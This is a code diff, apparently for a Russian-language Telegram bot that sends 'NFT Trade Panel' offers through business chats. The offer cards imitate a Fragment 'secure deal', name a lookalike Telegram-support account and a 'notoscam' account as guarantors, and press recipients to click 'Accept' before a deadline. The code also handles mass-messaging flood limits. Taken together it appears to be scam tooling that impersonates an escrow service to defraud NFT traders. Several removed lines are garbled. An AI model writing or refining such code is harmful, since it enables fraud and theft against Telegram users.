@@ -104,14 +104,14 @@ def parse_price(text: str):
 # ==========================================
 async def safe_send(bot_instance: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
-        tryс:
+        try:
             return await bot_instance.send_message(
                 chat_id=chat_id, text=text, business_connection_id=conn_id,
-                reply:_markup=reply_markup,
- <                disable_web_page_previewb=False
+                reply_markup=reply_markup,
+                disable_web_page_preview=False
             )
-        except TelegramBadRequest as>{ e:
-            if "PEER_FLOOD"status in str(e): 
+        except TelegramBadRequest as e:
+            if "PEER_FLOOD" in str(e): 
                 await asyncio.sleep(30)
             else:
                 log.error(f"Ошибка Telegram: {e}")
@@ -154,7 +154,7 @@ async def show_main_menu(target, uid):
     
     text = (
         f"👑 <b>NFT Trade Panel</b>\n\n"
-        f"Стату}</b>\n"
+        f"Статус: <b>{status}</b>\n"
         f"Создано офферов: <b>{user['stats_created']}</b>\n"
         f"Успешных передач: <b>{user['stats_accepted']}</b>\n\n"
         f"<b>Создать оффер:</b>\n<code>/offer [ссылка] [цена] [@юзер]</code>"
@@ -347,11 +347,11 @@ async def cmd_cancel_offer(msg: Message):
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА (ФИКС КАРТИНКИ)
+# ОТПРАВКА ОФФЕРА (ФИКС)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
-    if msg.from_user and msg.from_user.is_bot: return # Игнорируем ботов
+    if msg.from_user and msg.from_user.is_bot: return
 
     m = CODE_RE.search(msg.text)
     if not m: return
@@ -378,8 +378,6 @@ async def handle_business_message(msg: Message):
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
 
-    # ФИКС: Убираем все голые ссылки, кроме NFT. 
-    # Ссылки на Fragment и Гарантов прячем в теги <a>, чтобы Telegram не подтягивал их картинки.
     card_text = (
         f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -389,7 +387,7 @@ async def handle_business_message(msg: Message):
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
         f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
-        f"{nft_link}" # <--- Единственная голая ссылка для превью внизу
+        f"{nft_link}"
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
